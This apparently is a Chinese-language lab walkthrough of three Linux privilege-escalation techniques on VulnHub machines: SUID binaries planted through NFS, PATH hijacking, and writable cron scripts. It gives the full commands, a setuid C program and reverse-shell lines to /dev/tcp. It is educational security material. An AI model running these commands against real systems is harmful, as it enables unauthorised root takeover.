---
title: "Linux系统提权：NFS、PATH变量、Cron任务（配合SUID）"
pubDate: 2026-08-21
tags:
  - 安全
  - 提权
---

Linux 提权配置类：NFS 挂载利用、PATH 环境变量劫持、Cron 定时任务修改

## 三个概念先认识

- **NFS**：分布式文件系统协议，允许远程像本地一样读写文件（基于 TCP/IP）
- **Cron**：Linux 定时执行任务的程序，到点自动跑脚本/命令
- **PATH**：环境变量，指定系统执行命令时去哪几个文件夹找可执行文件

## NFS 提权（HackDudo 靶机）

靶场：https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/ （Virtualbox + Host-Only 网络）

**前提**：NFS 端口服务开启 + 有 web 或用户权限

**思路**：NFS 共享目录可挂载 → 往共享目录放一个高权限程序（SUID）→ 目标机上以普通用户身份执行它 → 以 root 身份跑

**步骤**：

```shell
# 1. 看目标 NFS 导出了哪些共享目录
showmount -e <IP>

# 2. 本地建目录并挂载目标的 /mnt/nfs
mkdir /tmp/nfs
sudo mount -t nfs <IP>:/mnt/nfs ./nfs

# 3. 上传一个高权限程序到共享目录（这里传 find）
whereis find
sudo cp /usr/bin/find ./nfs/find1
# 给足权限

# 4. 目标机上有任意文件读取漏洞可以读 /etc/passwd
# http://<IP>/file.php?file=/etc/passwd
# 顺带用 web 权限往 nfs 里传马，哥斯拉连接拿普通用户 shell

# 5. 在 shell 里用 SUID 的 find1 提权
./find1 -exec /bin/sh \; -quit
```

直接传 find 可能因 glibc 版本不匹配执行失败
1. 找和目标内核/glibc 相似的系统，传那个系统的 find
2. 自己写 C 程序静态编译后上传：

```c
#include <stdlib.h>
#include <unistd.h>
int main() {
	setuid(0);
	system("id");
	system("whoami");
}
```

```shell
gcc -s -static -o getroot getroot.c
chmod 777 getroot
chmod +s getroot
```

执行成功即以 root 身份跑命令

## PATH 变量提权（Symfonos 靶机）

靶场：https://www.vulnhub.com/entry/symfonos-1,322/

**前提**：存在 SUID 的程序，且它在运行时调用了外部命令，这个命令路径由 PATH 决定

**思路**：系统执行命令按 PATH 从左到右找文件 → 控制 PATH 加一个自己的目录 → 在该目录放同名恶意文件 → 触发 SUID 程序执行它 → 拿到 root

**步骤**：

```shell
# 1. 找 SUID 文件
find / -perm -u=s -type f 2>/dev/null

# 2. 用 strings 看它调用了什么命令（这里 statuscheck 调用了 curl）
strings /opt/statuscheck

# 3. 看当前 PATH
echo $PATH

# 4. 在 /tmp 放恶意 curl，把 /tmp 加进 PATH 前面
cd /tmp
echo "whoami" > curl
chmod 777 curl
export PATH=/tmp:$PATH

# 5. 触发 SUID 程序，调用链：statuscheck(suid) → curl(恶意) → root
/opt/statuscheck
```

## Cron 任务提权（Jarbas 靶机）

靶场：https://www.vulnhub.com/entry/jarbas-1,232/

**前提**：Web 或用户权限能查看计划任务 + 计划任务里的文件可修改

**思路**：计划任务以高权限定期执行脚本 → 能改脚本内容 → 写入反弹 shell → 等高权限回连

**步骤**：

```shell
# 1. 拿 shell（这里是 Jenkins 后台用泄漏账密登录，建任务反弹）
# 账号 eder 密码 vipsu
bash -i >& /dev/tcp/<IP>/8888 0>&1

# 2. 看计划任务，找到每 5 分钟执行一次的脚本
cat /etc/crontab

# 3. 检查脚本权限，确认可写
ls -lia /etc/script/CleaningScript.sh

# 4. 起监听，往脚本追加反弹 shell
echo "/bin/bash -i >& /dev/tcp/<IP>/8888 0>&1" >> /etc/script/CleaningScript.sh

# 5. 等几分钟，收到 root 反弹 shell
```

关键点：**一般我们没权限创建计划任务，所以套路是看计划任务里已存在的文件能不能改**脚本高权限执行，改了就等于劫持高权限执行

## 要点

NFS 提权就是挂载共享目录放 SUID 程序再执行；PATH 提权就是劫持环境变量伪造同名命令；Cron 提权就是改可写的定时脚本追加反弹 shell
